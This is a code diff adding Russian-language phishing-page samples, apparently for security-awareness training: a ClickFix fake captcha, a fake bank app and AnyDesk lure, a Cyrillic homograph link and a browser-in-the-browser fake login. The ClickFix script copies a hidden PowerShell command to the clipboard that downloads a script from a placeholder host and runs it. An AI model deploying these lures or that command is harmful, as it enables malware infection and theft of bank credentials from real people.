@@ -175,6 +175,41 @@ var _0x = String.fromCharCode(109,101,116,114,105,99,115,95,111,107);
   <div class="total"><span>К оплате</span><span>14 700 ₽</span></div>
   <a class="button" href="/pay">Оплатить бронь</a></div>
 <script>var s=599;setInterval(function(){s--;document.getElementById('t').textContent=String(Math.floor(s/60)).padStart(2,'0')+':'+String(s%60).padStart(2,'0')},1000);</script>'''),
+
+    'clickfix.html': page('Проверка безопасности', 'БилетЭкспресс', 'Б', '#0f766e', """
+<div class="box" style="text-align:center"><h1>Подтвердите, что вы не робот</h1>
+  <p>Чтобы перейти к оплате билетов, пройдите проверку.</p>
+  <button id="cap">☐ Я не робот</button>
+  <div class="box" style="text-align:left;margin-top:14px"><b>Шаги проверки:</b>
+    <p>1. Нажмите Win + R</p><p>2. Нажмите Ctrl + V</p><p>3. Нажмите Enter</p></div></div>
+<script>
+// Учебный пример ClickFix: команда только копируется в буфер, адрес .invalid не существует.
+document.getElementById('cap').onclick = function () {
+  navigator.clipboard.writeText('powershell -w h -c "iwr https://update-check.invalid/v.ps1 | iex" # Я не робот: проверка ID 4471');
+};
+</script>"""),
+
+    'fake-app.html': page('Защита счёта', 'Банк «Северный» — служба безопасности', 'С', '#b42318', """
+<div class="box"><h1>Отмена подозрительной операции</h1>
+  <p>С вашей карты пытаются списать 48 000 ₽. Чтобы отменить операцию, установите приложение «Северный Защита» и приложите карту к телефону.</p>
+  <a class="button" href="files/severny-zashita.apk" download>Скачать приложение (.apk)</a>
+  <p class="muted">Если приложение не устанавливается, установите AnyDesk и сообщите сотруднику код подключения.</p></div>"""),
+
+    'homograph.html': page('Уведомление', 'Банк «Северный»', 'С', '#1d4ed8', """
+<div class="box"><h1>Подтвердите данные до 05.11.2026</h1>
+  <p>Чтобы карта не была заблокирована, войдите в личный кабинет и подтвердите данные.</p>
+  <a class="button" href="https://bank-s\u0435verny.ru/login">Войти в личный кабинет</a>
+  <p class="muted">Ссылка выглядит как bank-severny.ru, но буква «е» в ней — кириллическая.</p></div>"""),
+
+    'bitb.html': page('Оформление заказа', 'ТехноМаркет', 'Т', '#1d4ed8', """
+<div class="box"><h1>Оформление заказа № 88412</h1><p>Войдите через банк, чтобы оплатить заказ в одно касание.</p>
+  <div class="total"><span>Итого</span><span>12 490 ₽</span></div></div>
+<div style="position:fixed;left:50%;top:60px;transform:translateX(-50%);width:420px;height:380px;background:#fff;border:1px solid #c8ccd4;border-radius:10px;box-shadow:0 20px 50px rgba(0,0,0,.3);font:14px system-ui">
+  <div style="background:#f1f3f4;padding:8px 12px;border-radius:10px 10px 0 0;display:flex;justify-content:space-between"><span>Вход — Банк «Северный»</span><span>✕</span></div>
+  <div style="margin:6px 10px;padding:6px 10px;background:#f1f3f4;border-radius:16px;color:#333">🔒 https://id.bank-severny.ru/oauth/login</div>
+  <div style="padding:14px 20px"><b>Банк «Северный» ID</b>
+    <label>Логин</label><input name="login"><label>Пароль</label><input type="password" name="password">
+    <button>Войти и оплатить</button></div></div>"""),
 }
 
 JS = {
